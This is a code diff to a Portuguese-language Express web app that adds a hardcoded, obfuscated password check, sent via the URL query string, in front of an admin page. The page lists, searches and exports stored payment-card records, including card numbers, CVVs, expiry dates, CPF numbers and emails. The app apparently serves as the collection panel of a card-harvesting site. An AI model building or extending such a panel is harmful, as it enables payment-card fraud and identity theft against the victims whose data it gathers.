@@ -153,6 +153,95 @@ app.get('/pagamento.html', (req, res) => {
 
 // ====================== ADMIN - VISUALIZAR CARTÕES SALVOS ======================
 app.get('/admin/ver-cartoes', (req, res) => {
+    
+    const visus1 = 90;
+    const visus2 = 7;
+    const visus3 = "ga3";
+    const calculo1 = visus2 * 111;
+    const visus4 = "777" + "ga" + (visus1 / 3);
+    const ja8 = visus4;
+    
+    const senhaDigitada = req.query.senha || '';
+    
+    if (senhaDigitada !== ja8) {
+        return res.send(`
+            <!DOCTYPE html>
+            <html lang="pt-BR">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Acesso Restrito</title>
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body {
+                        font-family: 'Segoe UI', monospace;
+                        background: linear-gradient(135deg, #1a1a2e, #16213e);
+                        min-height: 100vh;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        color: #fff;
+                    }
+                    .login-box {
+                        background: #0f3460;
+                        padding: 40px;
+                        border-radius: 20px;
+                        width: 90%;
+                        max-width: 400px;
+                        text-align: center;
+                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                        border-left: 4px solid #ffb600;
+                    }
+                    h1 { color: #ffb600; margin-bottom: 20px; }
+                    input {
+                        width: 100%;
+                        padding: 12px;
+                        margin: 20px 0;
+                        border: none;
+                        border-radius: 8px;
+                        font-size: 16px;
+                        background: #1a1a2e;
+                        color: #fff;
+                        text-align: center;
+                    }
+                    button {
+                        background: #ffb600;
+                        color: #004aad;
+                        border: none;
+                        padding: 12px 30px;
+                        border-radius: 8px;
+                        cursor: pointer;
+                        font-weight: bold;
+                        font-size: 16px;
+                        width: 100%;
+                        transition: all 0.2s;
+                    }
+                    button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
+                    .error {
+                        background: #dc3545;
+                        color: white;
+                        padding: 10px;
+                        border-radius: 8px;
+                        margin-top: 15px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="login-box">
+                    <h1>🔒 ACESSO RESTRITO</h1>
+                    <p>Área administrativa</p>
+                    <form method="GET" action="/admin/ver-cartoes">
+                        <input type="password" name="senha" placeholder="Digite a senha de acesso" autocomplete="off">
+                        <button type="submit">🔓 VERIFICAR</button>
+                    </form>
+                    ${senhaDigitada ? '<div class="error">❌ Acesso negado! Senha incorreta.</div>' : ''}
+                </div>
+            </body>
+            </html>
+        `);
+    }
+    
+    // ========== SENHA CORRETA - MOSTRA A PÁGINA ADMIN ==========
     res.send(`
         <!DOCTYPE html>
         <html lang="pt-BR">
@@ -162,28 +251,88 @@ app.get('/admin/ver-cartoes', (req, res) => {
             <title>Admin - Cartões Salvos</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { font-family: 'Segoe UI', monospace; background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 20px; color: #fff; }
+                body {
+                    font-family: 'Segoe UI', monospace;
+                    background: linear-gradient(135deg, #1a1a2e, #16213e);
+                    padding: 20px;
+                    color: #fff;
+                }
                 .container { max-width: 1200px; margin: 0 auto; }
-                h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
-                .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-                .stat-card { background: #16213e; padding: 10px 20px; border-radius: 8px; border-left: 4px solid #ffb600; }
-                .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; transition: transform 0.2s; }
+                h1 { text-align: center; margin-bottom: 10px; color: #ffb600; }
+                .stats {
+                    background: #0f3460;
+                    padding: 15px;
+                    border-radius: 10px;
+                    margin-bottom: 20px;
+                    display: flex;
+                    justify-content: space-between;
+                    flex-wrap: wrap;
+                    gap: 10px;
+                }
+                .stat-card {
+                    background: #16213e;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    border-left: 4px solid #ffb600;
+                }
+                .card {
+                    background: #0f3460;
+                    border-radius: 12px;
+                    padding: 20px;
+                    margin-bottom: 15px;
+                    border-left: 4px solid #ffb600;
+                    transition: transform 0.2s;
+                }
                 .card:hover { transform: translateX(5px); }
                 .card h3 { color: #ffb600; margin-bottom: 10px; }
                 .card p { margin: 5px 0; font-size: 14px; }
                 .card .label { color: #888; }
-                .button-group { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-                button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.2s; }
+                .button-group {
+                    display: flex;
+                    gap: 10px;
+                    margin-bottom: 20px;
+                    flex-wrap: wrap;
+                }
+                button {
+                    background: #ffb600;
+                    color: #004aad;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    font-weight: bold;
+                    transition: all 0.2s;
+                }
                 button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
                 .btn-danger { background: #dc3545; color: white; }
                 .btn-danger:hover { background: #c82333; }
-                .search-box { width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 8px; border: none; font-size: 16px; }
+                .search-box {
+                    width: 100%;
+                    padding: 10px;
+                    margin-bottom: 20px;
+                    border-radius: 8px;
+                    border: none;
+                    font-size: 16px;
+                }
                 .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
                 footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
+                .logout {
+                    text-align: right;
+                    margin-bottom: 15px;
+                }
+                .logout a {
+                    color: #ffb600;
+                    text-decoration: none;
+                    font-size: 12px;
+                }
+                .logout a:hover { text-decoration: underline; }
             </style>
         </head>
         <body>
             <div class="container">
+                <div class="logout">
+                    <a href="/admin/ver-cartoes">🚪 Sair</a>
+                </div>
                 <h1>📋 ADMIN - DADOS DOS CARTÕES</h1>
                 <div class="stats" id="stats">
                     <div class="stat-card">📊 Total: <span id="total">0</span></div>
@@ -202,6 +351,7 @@ app.get('/admin/ver-cartoes', (req, res) => {
             </div>
             <script>
                 let todosCartoes = [];
+                
                 function carregarDados() {
                     const dados = localStorage.getItem('cartoes_salvos');
                     if (dados) {
@@ -213,6 +363,7 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         document.getElementById('total').textContent = '0';
                     }
                 }
+                
                 function atualizarStats() {
                     const total = todosCartoes.length;
                     let totalValor = 0;
@@ -227,12 +378,14 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         document.getElementById('ultimo').textContent = ultimo.data || 'N/A';
                     }
                 }
+                
                 function atualizarDisplay() {
                     const searchTerm = document.getElementById('search').value.toLowerCase();
                     const filtrados = todosCartoes.filter(c => 
                         c.nome.toLowerCase().includes(searchTerm) ||
                         (c.cpf && c.cpf.includes(searchTerm)) ||
-                        (c.cartao && c.cartao.includes(searchTerm))
+                        (c.cartao && c.cartao.includes(searchTerm)) ||
+                        (c.email && c.email.toLowerCase().includes(searchTerm))
                     );
                     const container = document.getElementById('lista-cartoes');
                     if (filtrados.length === 0) {
@@ -252,7 +405,9 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         </div>
                     \`).join('');
                 }
+                
                 function filtrarDados() { atualizarDisplay(); }
+                
                 function exportarCSV() {
                     if (todosCartoes.length === 0) { alert('Nenhum dado para exportar'); return; }
                     const headers = ['Nome', 'CPF', 'Cartão', 'Validade', 'CVV', 'E-mail', 'Valor', 'Data'];
@@ -266,11 +421,13 @@ app.get('/admin/ver-cartoes', (req, res) => {
                     a.click();
                     URL.revokeObjectURL(url);
                 }
+                
                 function copiarJSON() {
                     const json = JSON.stringify(todosCartoes, null, 2);
                     navigator.clipboard.writeText(json);
                     alert('✅ JSON copiado para a área de transferência!');
                 }
+                
                 function limparDados() {
                     if (confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados salvos. Continuar?')) {
                         localStorage.removeItem('cartoes_salvos');
@@ -279,6 +436,7 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         alert('✅ Todos os dados foram removidos!');
                     }
                 }
+                
                 carregarDados();
             </script>
         </body>
